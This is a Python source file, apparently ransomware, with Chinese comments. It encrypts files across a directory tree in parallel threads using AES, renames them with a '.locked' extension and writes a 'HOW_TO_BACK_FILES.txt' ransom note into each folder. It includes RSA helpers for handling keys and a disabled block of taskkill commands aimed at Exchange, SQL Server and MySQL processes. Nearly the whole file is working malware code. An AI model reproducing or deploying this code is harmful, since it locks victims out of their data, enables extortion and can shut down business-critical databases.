import os

from lib.system_manager import *

from base64 import b64encode
from threading import Thread

from Crypto.Cipher import AES

from Crypto.Cipher import PKCS1_v1_5 as Cipher_pkcs1_v1_5
from Crypto.PublicKey import RSA

BLOCK_SIZE = 16  # Bytes
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * \
                chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)
unpad = lambda s: s[:-ord(s[len(s) - 1:])]

def pkcs7padding(text):
    bs = AES.block_size  # 16
    length = len(text)
    bytes_length = len(bytes(text, encoding='utf-8'))
    # tips：utf-8编码时，英文占1个byte，而中文占3个byte
    padding_size = length if(bytes_length == length) else bytes_length
    padding = bs - padding_size % bs
    # tips：chr(padding)看与其它语言的约定，有的会使用'\0'
    padding_text = chr(padding) * padding
    return text + padding_text

def pkcs7unpadding(text):
    length = len(text)
    unpadding = ord(text[length-1])
    return text[0:length-unpadding]

def aesEncrypt(key, content):
    # aes加密函数
    key_bytes = bytes(key, encoding='utf-8')
    iv = key_bytes
    cipher = AES.new(key_bytes, AES.MODE_CBC, iv)
    # 处理明文
    content_padding = pkcs7padding(content)
    # 加密
    encrypt_bytes = cipher.encrypt(bytes(content_padding, encoding='utf-8'))
    return encrypt_bytes


def aesDecrypt(key, encrypt_bytes):
    # aes解密函数
    key_bytes = bytes(key, encoding='utf-8')
    iv = key_bytes
    cipher = AES.new(key_bytes, AES.MODE_CBC, iv)
    # 解密
    decrypt_bytes = cipher.decrypt(encrypt_bytes)
    # 重新编码
    result = str(decrypt_bytes, encoding='utf-8')
    # 去除填充内容
    result = pkcs7unpadding(result)
    return result

def rsa_long_encrypt(rsa_public_key, plantext):
    # rsa加密函数
    length = len(plantext)
    default_length = 200
    pubobj = Cipher_pkcs1_v1_5.new(RSA.importKey(rsa_public_key))
    if length < default_length:
        return pubobj.encrypt(plantext)
    offset = 0
    res = []
    while length - offset > 0:
        if length - offset > default_length:
            res.append(pubobj.encrypt(plantext[offset:offset + default_length]))
        else:
            res.append(pubobj.encrypt(plantext[offset:]))
        offset += default_length
    byte_data = b''.join(res)

    return byte_data
    # return b64encode(byte_data)

def rsa_long_decrypt(rsa_privacy_key, data):
    # rsa解密函数
    length = len(data)
    default_length = 256
    pubobj = Cipher_pkcs1_v1_5.new(RSA.importKey(rsa_privacy_key))
    if length < default_length:
        return pubobj.decrypt(data, None)
    offset = 0
    res = []
    while length - offset > 0:
        if length - offset > default_length:
            res.append(pubobj.decrypt(data[offset:offset + default_length], None))
        else:
            res.append(pubobj.decrypt(data[offset:], None))
        offset += default_length
    byte_data = b''.join(res)

    return byte_data
    # return b64encode(byte_data)

def encrypt_file(fname,msg,aes_key):
    #文件加密
    print("[Encrypt]", fname)
    lookme = fname + ".locked"
    if os.path.isfile(lookme):
        return 0
    if "HOW_TO_BACK_FILES.txt" in fname:
        return 0
    try:
        fd = open(fname, "r")
        plantext = fd.read()
        fd.close()
        encrypt_data = aesEncrypt(aes_key, plantext)
        if encrypt_data:
            fd = open(fname, "wb")
            fd.write(encrypt_data)
            fd.close()
            os.rename(fname, fname+'.locked')
    except:
        pass

def decrypt_file(fname,aes_key):
    #文件解密
    print("[Decrypt]", fname)
    try:
        fd = open(fname, "rb")
        plantext = fd.read()
        fd.close()
        decrypt_data = aesDecrypt(aes_key, plantext)
        if decrypt_data:
            fd = open(fname, "w")
            fd.write(decrypt_data)
            fd.close()
            os.rename(fname, fname.replace('.locked', ""))
    except:
        pass

def Encrypt(path, msg, aes_key):
    # 多线程加密文件
    if False:
        os.popen("taskkill /F /IM Microsoft.Exchange.*")
        os.popen("taskkill /F /IM MSExange*")
        os.popen("taskkill /F /IM sqlserver.exe")
        os.popen("taskkill /F /IM sqlwriter.exe")
        os.popen("taskkill /F /IM mysqld.exe")
    for file in discoverFiles_encry(path):
        try:
            t = Thread(target=encrypt_file, args=(file, msg, aes_key))
            t.start()
            try:
                file_path = os.path.dirname(file)
                infof = os.path.join(file_path, "HOW_TO_BACK_FILES.txt")
                with open(infof, "wb") as f:
                    f.write(msg)
            except:
                pass
        except:
            pass

def Decrypt(path, aes_key):
    # 多线程解密文件
    for file in discoverFiles_decry(path):
        try:
            t = Thread(target=decrypt_file, args=(file, aes_key))
            t.start()
        except:
            pass
